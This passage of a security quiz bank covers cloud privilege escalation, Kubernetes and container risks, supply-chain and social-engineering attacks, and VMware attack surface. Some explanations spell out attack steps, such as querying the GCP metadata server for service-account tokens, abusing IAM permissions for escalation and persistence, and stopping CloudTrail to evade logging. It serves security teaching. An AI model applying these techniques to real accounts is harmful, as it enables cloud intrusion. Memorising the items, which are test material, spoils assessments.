questions.explanation: HID Prox (125 kHz) and EM4100 cards transmit their card number in plaintext with no encryption or mutual authentication, making them trivially clonable with tools like the Proxmark3. Modern replacements like iCLASS SE and Seos implement encryption.

questions.question: What is the key difference between SAST (Static Application Security Testing) and DAST (Dynamic Application Security Testing)?

options.A: SAST tests compiled binaries while DAST tests source code
options.B: SAST analyses source code without executing it; DAST tests the running application by sending inputs and observing outputs
options.C: SAST is manual code review while DAST is automated scanning
options.D: SAST only detects injection flaws while DAST detects logic errors

questions.explanation: SAST (white-box) analyses source code, bytecode, or binaries without execution, finding issues like hardcoded secrets and injection vulnerabilities early in development. DAST (black-box) sends inputs to the running application, discovering runtime issues like authentication bypass and injection.

questions.question: A developer commits a file containing AWS_SECRET_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE to a public GitHub repository. Which tool is specifically designed to detect this type of secret exposure in git history?

options.A: Trivy
options.B: Checkov
options.C: truffleHog / gitleaks
options.D: Snyk

questions.explanation: truffleHog and gitleaks scan git repositories (including full commit history) for secrets like API keys, passwords, and private keys using entropy analysis and regex patterns. They can detect secrets that were previously committed and then removed.

questions.question: Which threat modelling methodology uses the acronym STRIDE to categorise threats?

options.A: Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege
options.B: SQL injection, Traversal, Remote code execution, Identity theft, Data exfiltration, Escalation
options.C: Sniffing, Timing, Replay, Integrity bypass, DDoS, Exploit
options.D: Session hijacking, Token forgery, Rootkit, Input validation, DoS, Enumeration

questions.explanation: STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege) was developed by Microsoft to categorise threats against software systems, providing a structured approach to identifying security risks during design.

questions.question: A malicious npm package named 'lodahs' mimics the popular 'lodash' library. What type of supply chain attack is this?

options.A: Dependency confusion
options.B: Typosquatting
options.C: Brandjacking
options.D: Repo-jacking

questions.explanation: Typosquatting registers package names that are common typos of popular packages, hoping developers will accidentally install them. 'lodahs' vs 'lodash' is a classic example. These malicious packages typically contain credential-stealing or backdoor code.

questions.question: What is a dependency confusion (namespace confusion) attack?

options.A: Publishing a malicious package with the same name as an internal private package to a public registry, causing package managers to download the public (malicious) version
options.B: Creating a typo of a popular public package to trick developers
options.C: Compromising the maintainer account of a legitimate package
options.D: Injecting malicious code into a pull request to an open-source dependency

questions.explanation: Dependency confusion exploits the fact that many package managers (npm, pip, gem) prefer public registry packages over private ones when the same name exists. An attacker publishes a public package with the same name as a company's internal package with a higher version number, causing automatic installation.

questions.question: Which IaC security scanning tool checks Terraform and CloudFormation templates for misconfigurations such as overly permissive S3 buckets or unencrypted resources?

options.A: Trivy
options.B: Checkov
options.C: Snyk
options.D: Semgrep

questions.explanation: Checkov is an open-source IaC static analysis tool that scans Terraform, CloudFormation, Kubernetes manifests, and ARM templates for security and compliance misconfigurations against CIS benchmarks and cloud security best practices.

questions.question: During a CI/CD pipeline security review, an attacker finds that a GitHub Actions workflow triggers on 'pull_request_target' and checks out the PR branch. Why is this dangerous?

options.A: It allows any contributor to view private environment variables
options.B: pull_request_target runs with write repository permissions and access to secrets; checking out untrusted PR code and running it can expose secrets to the attacker's fork
options.C: The pull_request_target event bypasses branch protection rules
options.D: It creates a GitHub token with admin permissions by default

questions.explanation: pull_request_target runs in the context of the base repository with write permissions and access to secrets (unlike pull_request which runs with read-only access). If it checks out and executes code from the PR branch, an attacker can steal repository secrets by crafting a malicious PR.

questions.question: Which social engineering technique involves calling a target and impersonating a figure of authority (e.g., IT helpdesk, bank) to extract sensitive information?

options.A: Phishing
options.B: Smishing
options.C: Vishing
options.D: Pretexting

questions.explanation: Vishing (voice phishing) uses phone calls with a fabricated scenario (pretext) to manipulate targets into revealing credentials, OTP codes, or sensitive data. Caller ID spoofing makes the call appear to originate from a trusted number.

questions.question: An attacker sends an email appearing to come from the CEO asking the CFO to urgently transfer funds to a new supplier account. What is this attack called?

options.A: Spear-phishing
options.B: Business Email Compromise (BEC) / Whaling
options.C: Clone phishing
options.D: Smishing

questions.explanation: This is Business Email Compromise (BEC) targeting a high-value executive (CFO), also called 'whaling' when targeting C-level executives. It exploits urgency and authority to bypass normal approval processes, resulting in fraudulent wire transfers.

questions.question: Which OSINT tool is primarily used to map relationships between organisations, people, email addresses, and domains using a visual graph interface?

options.A: theHarvester
options.B: Shodan
options.C: Maltego
options.D: Recon-ng

questions.explanation: Maltego is an OSINT platform that visualises relationships between entities (people, organisations, domains, IPs, email addresses) using a graph-based interface. It uses 'transforms' to query various data sources and build intelligence graphs.

questions.question: What is the primary purpose of OSINT (Open Source Intelligence) gathering in the context of a social engineering engagement?

options.A: To identify technical vulnerabilities in the target's network infrastructure
options.B: To collect publicly available information about targets (employees, organisational structure, technology stack) to craft convincing pretexts
options.C: To enumerate the target's Active Directory structure via LDAP
options.D: To identify unpatched software versions using Shodan

questions.explanation: OSINT for social engineering focuses on gathering employee names, roles, email formats, recent news, technology stacks, and organisational details from sources like LinkedIn, company websites, and job postings to build credible pretexts for phishing and vishing attacks.

questions.question: Which psychological principle does an attacker exploit when they create a fake 'only 2 spots left — act now' scenario in a phishing email?

options.A: Social proof
options.B: Authority
options.C: Scarcity / urgency
options.D: Reciprocity

questions.explanation: Scarcity and urgency are Cialdini principles of influence. Creating artificial time pressure or limited availability reduces victims' critical thinking and pushes them to act quickly without verifying the legitimacy of the request — a core technique in phishing attacks.

questions.question: A social engineering tester calls a company's IT helpdesk and claims to be a new employee who cannot access their account. They then ask for a password reset. What countermeasure should the helpdesk use?

options.A: Ask for the employee's date of birth
options.B: Verify identity through an out-of-band channel (e.g., callback to the employee's manager or pre-registered phone number) and require a ticket number
options.C: Ask them to describe their department's function
options.D: Only grant access during business hours

questions.explanation: Robust identity verification requires out-of-band confirmation through a separate pre-established channel. Calling back a verified phone number or requiring manager authorisation prevents attackers from obtaining account access through impersonation over a single communication channel.

questions.question: Which AWS IAM action, if granted to an attacker, allows them to attach the AdministratorAccess policy to themselves and gain full AWS access?

options.A: iam:GetPolicy
options.B: iam:AttachUserPolicy
options.C: iam:ListPolicies
options.D: iam:GetUser

questions.explanation: iam:AttachUserPolicy allows attaching any managed IAM policy to a user. Combined with access to the AdministratorAccess ARN, an attacker can grant themselves full AWS access without creating new resources.

questions.question: An attacker discovers an AWS Lambda function with the environment variable DATABASE_PASSWORD set in plaintext. How can this be remediated?

options.A: Base64-encode the password in the environment variable
options.B: Store the secret in AWS Secrets Manager or SSM Parameter Store and retrieve it at runtime via the SDK
options.C: Encrypt the environment variable with the Lambda function's execution role key
options.D: Move the password to the Lambda function's dead letter queue

questions.explanation: Secrets should never be stored as plaintext environment variables. AWS Secrets Manager or SSM Parameter Store (SecureString) provide encrypted, audited, and rotatable secret storage retrieved by the function at runtime.

questions.question: Which AWS attack technique uses the iam:PassRole permission combined with ec2:RunInstances to escalate privileges?

options.A: Launch an EC2 instance with a higher-privileged IAM instance profile than the attacker's current role, then access its IMDS credentials
options.B: Use iam:PassRole to directly assume any IAM role in the account
options.C: Create a new IAM user with administrator permissions using the passed role
options.D: Attach a privilege-escalation policy to the EC2 service principal

questions.explanation: iam:PassRole allows assigning an IAM role to an AWS service. With ec2:RunInstances, an attacker can launch an EC2 instance with a more privileged instance profile than they currently hold, then retrieve its temporary credentials from the IMDS endpoint.

questions.question: What is the risk of a publicly accessible AWS EBS snapshot?

options.A: The snapshot can be used to DDoS the originating EC2 instance
options.B: Anyone can create a volume from the snapshot and mount it to access all data on the original disk, including credentials, source code, and databases
options.C: Public snapshots allow arbitrary code execution on the source EC2 instance
options.D: The snapshot exposes the instance's network interfaces to the public internet

questions.explanation: Public EBS snapshots can be copied or used to create volumes by any AWS account. An attacker mounts the resulting volume to their own EC2 instance and gets full read access to the original disk — a significant data exposure risk.

questions.question: Which AWS service, when misconfigured with a resource-based policy that includes 'Principal: *', creates an unauthenticated access risk?

options.A: AWS CloudTrail
options.B: Amazon SQS queue policy
options.C: AWS IAM password policy
options.D: AWS Config rules

questions.explanation: SQS queue policies (and similarly S3, SNS, Lambda, etc.) can include resource-based policies with Principal: *, granting public access. A publicly readable SQS queue leaks messages; a publicly writable queue enables queue poisoning.

questions.question: What does the 'enumerate-iam' tool do during an AWS penetration test?

options.A: Dumps all IAM users and their password hashes
options.B: Brute-forces which IAM actions are permitted for a given set of credentials by making API calls and checking for AccessDenied vs success responses
options.C: Automatically escalates IAM privileges using known misconfiguration chains
options.D: Exports all IAM policies to a local file for offline analysis

questions.explanation: enumerate-iam calls a wide range of AWS API actions with the provided credentials and categorises results as allowed or denied. This enumerates the effective permissions of a compromised identity without needing iam:SimulatePrincipalPolicy.

questions.question: An Azure penetration tester runs: az account get-access-token. What does the returned JWT token contain?

options.A: The user's plaintext Azure AD password
options.B: A signed OAuth 2.0 bearer token encoding the user's identity and Azure RBAC permissions, usable to authenticate to Azure REST APIs
options.C: The subscription's billing account ID
options.D: A Kerberos TGT for Azure AD authentication

questions.explanation: The Azure access token is a JWT bearer token containing claims about the authenticated identity (oid, upn, roles) and is accepted by Azure Resource Manager and other Azure APIs. Stolen tokens allow impersonation for the token's lifetime (typically 1 hour).

questions.question: Which Azure RBAC role is the most privileged and should be restricted to break-glass accounts only?

options.A: Contributor
options.B: Owner
options.C: Global Administrator (at Azure AD level)
options.D: User Access Administrator

questions.explanation: The Owner role grants full access to all resources and the ability to manage access. Global Administrator is an Azure AD role (not RBAC) that can elevate to Owner. Both should be restricted; Owner on a subscription with sensitive resources is a critical finding.

questions.question: Which attack abuses a GCP service account's default permissions to access the metadata server and escalate within a GCP project?

options.A: From a compromised GCE instance, query http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token to retrieve the access token for the attached service account
options.B: Use gcloud to list all service accounts and brute-force their passwords
options.C: Abuse the GCP Cloud Interconnect to pivot between projects
options.D: Exploit a GCP IAM policy inheritance bug to gain project-wide admin

questions.explanation: Like AWS IMDS, GCP's metadata server provides access tokens for the attached service account. Unlike AWS IMDSv2, GCP metadata requires the Metadata-Flavor: Google header but not a session token, making it exploitable via SSRF.

questions.question: What security risk does a GitHub Actions workflow secret pose if the workflow has 'pull_request' as a trigger from a public fork?

options.A: Forks can read secrets directly from the repository settings page
options.B: Secrets are not passed to workflows triggered by pull_request from a fork by default, so the risk is low for this specific trigger
options.C: Any public fork can exfiltrate all secrets by reading the workflow YAML
options.D: GitHub automatically exposes secrets as environment variables in all workflow steps

questions.explanation: GitHub intentionally does not pass secrets to pull_request workflows triggered from public forks to prevent secret exfiltration. The risk comes from pull_request_target (which does pass secrets) or when maintainers approve workflow runs from first-time contributors.

questions.question: What is a 'confused deputy' attack in the context of AWS cross-account role assumption?

options.A: Exploiting a misconfigured SCP to bypass AWS Organizations guardrails
options.B: Tricking a service (the 'deputy') that has permissions to act on behalf of another account into performing actions on the attacker's behalf by abusing aws:SourceAccount or aws:SourceArn conditions
options.C: Using stolen credentials to assume a role in a different AWS account
options.D: Creating a cross-account trust relationship to pivot between AWS accounts

questions.explanation: A confused deputy attack exploits a trusted intermediary (e.g., a Lambda or S3 service) that lacks proper caller validation. Without aws:SourceAccount or aws:SourceArn conditions in the trust policy, any account can trick the service into acting on their behalf.

questions.question: Prowler is used to assess AWS environments against which standards?

options.A: Only the AWS Well-Architected Framework
options.B: CIS AWS Foundations Benchmark, GDPR, HIPAA, SOC 2, PCI-DSS, and custom security checks
options.C: Only NIST 800-53 controls
options.D: Only the AWS Security Hub findings format

questions.explanation: Prowler is an open-source AWS/Azure/GCP security tool that checks environments against CIS Benchmarks, GDPR, HIPAA, SOC 2, PCI-DSS, and many other compliance frameworks, generating reports on misconfigurations and security gaps.

questions.question: An attacker with 'lambda:UpdateFunctionCode' permission on an existing Lambda function can do what?

options.A: Change the function's IAM execution role to one with more permissions
options.B: Replace the function's code with malicious code that runs with the function's existing IAM role permissions, potentially exfiltrating secrets or pivoting to other AWS services
options.C: Trigger the function on a custom schedule using EventBridge
options.D: Increase the function's memory to exhaust the account's Lambda limits

questions.explanation: lambda:UpdateFunctionCode allows replacing the function's code without changing its configuration. An attacker can deploy malicious code that exfiltrates environment variable secrets, calls other AWS services using the function's IAM role, or establishes a reverse shell.

questions.question: Which AWS CloudTrail finding most strongly indicates an attacker is attempting to blind the monitoring system?

options.A: cloudtrail:DescribeTrails called from an unknown IP
options.B: cloudtrail:StopLogging or cloudtrail:DeleteTrail called from an IP not associated with normal admin operations
options.C: s3:GetBucketLogging called on the CloudTrail S3 bucket
options.D: iam:ListUsers called with a large number of results

questions.explanation: cloudtrail:StopLogging and cloudtrail:DeleteTrail disable or remove audit logging. These are strong indicators of post-compromise defense evasion — attackers disable CloudTrail to prevent their subsequent actions from being logged.

questions.question: What is the purpose of AWS Service Control Policies (SCPs) in an AWS Organizations environment?

options.A: They define what IAM users in a single account can do
options.B: They set maximum permission boundaries for all accounts in an organization or OU, preventing even account-level administrators from exceeding the SCP-defined limits
options.C: They automatically remediate security misconfigurations across all accounts
options.D: They encrypt data at rest across all S3 buckets in the organization

questions.explanation: SCPs act as guardrails on AWS Organizations accounts/OUs. Even if an IAM policy in a member account grants a permission, an SCP that denies it takes precedence. SCPs are used to prevent actions like disabling CloudTrail or leaving regions, regardless of local IAM policies.

questions.question: An S3 bucket has 'Block Public Access' settings all set to OFF and a bucket policy granting 's3:GetObject' to 'Principal: *'. An attacker lists all objects and downloads sensitive files. Which AWS feature, if enabled at the account level, would have prevented this?

options.A: S3 default encryption
options.B: S3 Account-level Block Public Access
options.C: S3 Object Lock
options.D: S3 Versioning

questions.explanation: The S3 Account-level Block Public Access settings override bucket-level ACLs and policies, preventing any bucket in the account from being made publicly accessible. Even if a bucket policy grants public access, the account-level block prevents it from taking effect.

questions.question: Which cloud attack technique involves creating an IAM role with a trust policy that allows an external AWS account to assume it, establishing persistent backdoor access?

options.A: Cross-account shadow admin via trust policy manipulation
options.B: IAM credential stuffing
options.C: STS token replay attack
options.D: IAM federation abuse

questions.explanation: An attacker with iam:CreateRole and iam:AttachRolePolicy can create a role that trusts an external account they control, providing persistent access that survives password changes and MFA reset. This is a common cloud persistence technique.

questions.question: What is 'resource-based policy' confusion and why does it matter for AWS penetration testing?

options.A: When IAM policies conflict with resource-based policies, always the most permissive policy wins
options.B: Resource-based policies (on S3, SQS, Lambda, etc.) can grant cross-account or public access independently of IAM identity-based policies, creating attack vectors even when IAM is correctly configured
options.C: Resource-based policies are deprecated and replaced by IAM permission boundaries
options.D: Resource-based policies only apply within a single AWS account

questions.explanation: Resource-based policies attached to AWS resources (S3 bucket policies, Lambda resource policies, SQS queue policies) grant access directly and can allow external accounts or public principals regardless of the IAM identity-based policies of the accessing entity.

questions.question: During a cloud assessment, an attacker finds an EC2 instance running as the 'default' service account with no custom IAM role. What permissions does this instance have?

options.A: Full EC2 and S3 access by default
options.B: No IAM permissions at all — an instance without an attached IAM instance profile has no AWS API credentials available via IMDS
options.C: Read-only access to all AWS services in the account
options.D: Access to the same permissions as the account root user

questions.explanation: EC2 instances only receive IAM credentials via the IMDS if an IAM instance profile is attached. Without one, the IMDS returns an error for credential requests, and the instance has no AWS API permissions. This is a security best practice — attach only the minimum required role.

questions.question: Which attack technique abuses AWS STS (Security Token Service) temporary credentials that have already expired?

options.A: Expired STS credentials can still be used if the attacker crafts the request with a backdated timestamp
options.B: Expired STS credentials cannot be used — they are cryptographically validated and rejected by AWS APIs after their expiration time
options.C: Expired STS credentials can be refreshed without re-authenticating using the RefreshCredentials API
options.D: Expired STS credentials remain valid for 7 days in offline scenarios

questions.explanation: AWS STS credentials have an expiration time enforced server-side. Once expired, the credentials are rejected regardless of client-side manipulation. This is a key security property — stolen credentials have a limited window of usefulness (typically 1-12 hours for assumed role credentials).

questions.question: Which Kubernetes network policy configuration represents the most secure baseline for a production namespace?

options.A: No network policies applied (default allow-all)
options.B: A default-deny-all ingress and egress policy, with explicit allow rules for required traffic only
options.C: A policy allowing all traffic within the namespace but denying cross-namespace traffic
options.D: A policy denying all ingress but allowing all egress

questions.explanation: A default-deny policy that blocks all ingress and egress unless explicitly allowed implements the principle of least privilege for network traffic. This limits lateral movement if a pod is compromised and prevents data exfiltration via unexpected egress paths.

questions.question: What is the risk of running containers with hostPID=true?

options.A: The container can see and potentially interact with all processes on the host, enabling ptrace-based attacks against host processes
options.B: The container shares the host's network stack
options.C: The container can read the host's /etc/passwd file
options.D: The container's PID namespace is visible to other containers

questions.explanation: hostPID=true places the container's processes in the host's PID namespace, allowing the container to see all host processes. An attacker can use ptrace to inject code into privileged host processes or send signals (including SIGKILL) to any process on the host.

questions.question: Which Kubernetes admission controller prevents pods from running as root or with dangerous capabilities?

options.A: RBAC
options.B: NetworkPolicy
options.C: Pod Security Admission (PSA) / PodSecurityPolicy (deprecated)
options.D: OPA/Gatekeeper

questions.explanation: Pod Security Admission (PSA, replacing the deprecated PodSecurityPolicy) enforces security standards at the namespace level. Profiles (privileged, baseline, restricted) control whether pods can run as root, use host namespaces, or request dangerous capabilities.

questions.question: An attacker on a Kubernetes pod can reach the API server at https://kubernetes.default.svc. What does this allow if the pod has a default service account with no custom RBAC?

options.A: The pod has no Kubernetes API access since the default service account has no permissions
options.B: Full cluster-admin access since default service accounts are highly privileged
options.C: Read access to all secrets in the cluster
options.D: Only access to list pods in the same namespace

questions.explanation: In modern Kubernetes (1.22+), the default service account has no RBAC permissions by default. However, older clusters or those with permissive ClusterRoleBindings may grant excessive access. The token is always present; whether it can do anything depends on RBAC.

questions.question: Which tool is used to scan Docker images for known CVEs in OS packages and application dependencies?

options.A: Checkov
options.B: Trivy
options.C: Falco
options.D: kube-bench

questions.explanation: Trivy is an open-source vulnerability scanner that scans container images, filesystems, and IaC for known CVEs in OS packages (Alpine, Debian, Ubuntu, RHEL) and application dependencies (npm, pip, Maven, Go modules).

questions.question: What is Falco used for in a Kubernetes environment?

options.A: Scanning container images for vulnerabilities before deployment
options.B: Runtime security monitoring that detects anomalous behaviour (e.g., shells spawned in containers, sensitive file reads) using eBPF/kernel module
options.C: Enforcing network policies between pods
options.D: Managing secrets and certificates for pods

questions.explanation: Falco is a cloud-native runtime security tool that monitors system calls using eBPF or a kernel module. It detects container escape attempts, unexpected shell spawning, privilege escalation, and sensitive file access in real-time.

questions.question: Which Kubernetes component stores the cluster state (all objects, secrets, and configuration) and is a critical target during a penetration test?

options.A: kube-scheduler
options.B: kube-proxy
options.C: etcd
options.D: kubelet

questions.explanation: etcd is the distributed key-value store that holds all Kubernetes cluster state, including Secrets (base64-encoded), ConfigMaps, RBAC policies, and pod definitions. Direct access to etcd (port 2379) bypasses all Kubernetes RBAC and exposes all cluster secrets.

questions.question: A container image's Dockerfile contains: RUN echo 'DB_PASSWORD=secret123' >> /app/.env. What is the security risk?

options.A: The password is only in the build cache and not in the final image
options.B: The password is baked into an image layer and visible to anyone who can pull the image, even if a later layer deletes the file
options.C: The password is encrypted by Docker's layer encryption
options.D: The password is only accessible by processes running as root inside the container

questions.explanation: Docker images are composed of immutable layers. Even if a later RUN layer deletes /app/.env, the file persists in the earlier layer and is accessible via docker history, docker save, or by running the earlier layer. Secrets must never be added in Dockerfile RUN instructions.

questions.question: Which kubectl command checks whether a service account can perform a specific action, useful for assessing RBAC permissions during a Kubernetes pentest?

options.A: kubectl describe rolebinding
options.B: kubectl auth can-i get secrets -n kube-system --as=system:serviceaccount:default:default
options.C: kubectl get clusterrolebinding -o yaml
options.D: kubectl explain rbac

questions.explanation: kubectl auth can-i tests whether the current user (or a specified --as identity) can perform an action. This is essential for RBAC enumeration during K8s pentests, allowing testers to systematically check what a compromised service account can do.

questions.question: What is the security significance of a Kubernetes pod with 'automountServiceAccountToken: true' (the default)?

options.A: The pod automatically receives TLS certificates from cert-manager
options.B: A service account token is automatically mounted at /var/run/secrets/kubernetes.io/serviceaccount/token, which an attacker can use to authenticate to the Kubernetes API
options.C: The pod can automatically request additional RBAC permissions at runtime
options.D: Service account tokens are rotated every 30 minutes automatically

questions.explanation: By default, every pod gets a service account token mounted. This token authenticates to the Kubernetes API and can be stolen by an attacker who compromises the pod. Applications that don't need API access should set automountServiceAccountToken: false.

questions.question: Which Linux capability, if granted to a container, allows it to load kernel modules and effectively break out of the container isolation?

options.A: CAP_NET_ADMIN
options.B: CAP_SYS_PTRACE
options.C: CAP_SYS_MODULE
options.D: CAP_CHOWN

questions.explanation: CAP_SYS_MODULE allows loading and unloading kernel modules (insmod/rmmod). A container with this capability can load a malicious kernel module that disables container namespaces or creates a backdoor at the kernel level, completely bypassing container isolation.

questions.question: Which attack targets the VMware vCenter Server Single Sign-On (SSO) service to extract credentials for the entire virtualisation infrastructure?

options.A: Dumping the vCenter PostgreSQL database containing hashed SSO passwords
options.B: Exploiting the vCenter Server SSO LDAP bind using stolen ldap.keytab or extracting the idm.domain database
options.C: Pass-the-Ticket against the vCenter Kerberos realm
options.D: LDAP injection against the vCenter SSO LDAP endpoint

questions.explanation: vCenter SSO credentials are stored in the embedded LDAP directory (vmdir). Attackers who gain filesystem access to the vCenter appliance can extract the vmdir database or keytab files to obtain SSO administrator credentials, which control the entire vSphere environment.

questions.question: What is the difference between a Type 1 and Type 2 hypervisor from an attack surface perspective?

options.A: Type 1 has a larger attack surface because it runs more services
options.B: Type 2 has a larger attack surface because the host OS adds an additional layer that can be compromised to affect the hypervisor and all VMs
options.C: Both have identical attack surfaces as they use the same virtualisation APIs
options.D: Type 1 is vulnerable to guest-to-host escapes while Type 2 is not

questions.explanation: Type 2 hypervisors (VMware Workstation, VirtualBox) run on top of a host OS, meaning any compromise of the host OS also compromises the hypervisor and all VMs. Type 1 hypervisors have a smaller attack surface as they run directly on hardware without a general-purpose OS layer.

questions.question: In a VMware environment, what is the purpose of vMotion and what security risk does it introduce?

options.A: vMotion replicates VM backups; attackers can access backup data
options.B: vMotion live-migrates running VMs between hosts; if the vMotion network is unencrypted and not isolated, an attacker with network access can capture the VM's memory contents mid-migration
options.C: vMotion provides VM snapshots; snapshots contain plaintext credentials
options.D: vMotion manages VM licensing; attackers can disable VMs by revoking licenses

questions.explanation: vMotion transfers a running VM's entire memory state between ESXi hosts. Without encryption (enabled in vSphere 6.5+) and network isolation, an attacker who can intercept vMotion traffic can capture the full VM memory, including encryption keys and credentials.

questions.question: Which tool can be used to perform memory forensics on a VMware ESXi host by reading a running VM's memory without pausing it?

options.A: volatility with ESXi memory acquisition plugins
options.B: The VMware vSphere API's QueryMemory method combined with vmss2core to convert the memory into an analysable format
options.C: Directly reading /vmfs/volumes/<datastore>/<vm>/<vm>.vmem on the ESXi host
options.D: Using VMware's Memory Forensics Toolkit (MFT)

questions.explanation: The .vmem file on the ESXi datastore is the raw memory of a running or suspended VM. An attacker with ESXi host access can copy this file and analyse it with Volatility to extract encryption keys, credentials, and process memory without the VM being aware.

questions.question: What does 'anti-affinity rules' bypassing represent in a cloud provider's virtualisation layer?

options.A: Placing VMs from different security zones on the same physical host, enabling side-channel attacks like cache timing attacks between tenants
options.B: Disabling VM snapshot creation to prevent forensic analysis
options.C: Bypassing network isolation between VMs on different VLANs
options.D: Circumventing resource limits to cause DoS on neighbouring VMs

questions.explanation: Anti-affinity rules prevent VMs from co-locating on the same physical host. Co-location enables cross-VM side-channel attacks like Flush+Reload or Meltdown/Spectre variants that exploit shared CPU cache, TLB, or DRAM to leak data between isolated VMs.

questions.question: A penetration tester has access to an ESXi host's SSH interface. Which command lists all running VMs?

options.A: vmware -l
options.B: esxcli vm process list
options.C: vim-cmd vmsvc/getallvms
options.D: esxtop

questions.explanation: vim-cmd vmsvc/getallvms lists all registered VMs on an ESXi host. esxcli vm process list shows only running VM processes. These commands are essential during an ESXi post-compromise assessment to enumerate target VMs.

questions.question: What is the 'TOCTOU' (Time-of-Check to Time-of-Use) vulnerability class in the context of VM escape exploits?

options.A: Attacking the hypervisor's NTP synchronisation to manipulate VM clocks
options.B: Exploiting a race condition where the hypervisor checks a value (e.g., a shared memory pointer) before using it, allowing a malicious guest to change it between the check and use
options.C: Timing attacks against the hypervisor's TLS certificate validation
options.D: Using CPU timing differences to extract encryption keys from the hypervisor

questions.explanation: TOCTOU race conditions in hypervisors occur when the hypervisor validates a guest-provided value (e.g., a buffer address or length) at one point in time but uses it later, allowing the guest to replace it with a malicious value between validation and use.
